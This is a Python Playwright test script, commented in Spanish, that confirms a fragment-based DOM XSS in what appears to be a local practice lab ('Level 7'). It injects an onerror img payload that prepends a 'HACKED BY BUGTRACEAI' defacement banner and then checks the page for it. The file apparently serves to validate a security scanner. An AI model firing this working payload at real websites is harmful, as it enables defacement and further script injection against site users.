#!/usr/bin/env python3
"""
Test Fragment XSS Level 7 - usando estrategia documentada
Visual Defacement para PoE
"""
import asyncio
from playwright.async_api import async_playwright

async def test_fragment_visual():
    print("\n🎯 Test Fragment XSS Level 7 - Visual Defacement\n")
    print("="*60)
    
    # Payload con visual defacement (estrategia documentada)
    payload = "<img src=x onerror=\"var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)\">"
    test_url = f"http://127.0.0.1:5090/xss/level7#{payload}"
    
    print(f"Payload: Visual Defacement")
    print(f"URL: {test_url}\n")
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        
        try:
            print("📍 Navegando...")
            await page.goto(test_url, wait_until="load", timeout=10000)
            
            # Esperar ejecución
            await asyncio.sleep(2)
            
            # Verificar estrategia documentada
            html = await page.content()
            
            print("\n📊 Verificación PoE:")
            
            # 1. Visual Defacement Marker
            if "HACKED BY BUGTRACEAI" in html:
                print("✅ Visual Defacement detectado!")
                
                # 2. DOM Marker (bt-pwn)
                marker_exists = await page.query_selector("#bt-pwn")
                if marker_exists:
                    print("✅ DOM Marker (#bt-pwn) confirmado!")
                    print("\n🎉 ¡FRAGMENT XSS LEVEL 7 CONFIRMADO!")
                    print("\n📋 Evidencia:")
                    print("  - Visual marker: HACKED BY BUGTRACEAI")
                    print("  - DOM element: #bt-pwn created by JS")
                    print("  - Método: location.hash → innerHTML")
                    return True
                else:
                    print("🟡 Texto detectado pero sin DOM marker")
                    return False
            else:
                print("❌ No se detectó ejecución")
                print(f"Output div: {html[html.find('id=\"output\"'):html.find('id=\"output\"')+200] if 'id=\"output\"' in html else 'not found'}")
                return False
                
        except Exception as e:
            print(f"\n❌ Error: {e}")
            import traceback
            traceback.print_exc()
            return False
        finally:
            await browser.close()

if __name__ == "__main__":
    result = asyncio.run(test_fragment_visual())
    exit(0 if result else 1)
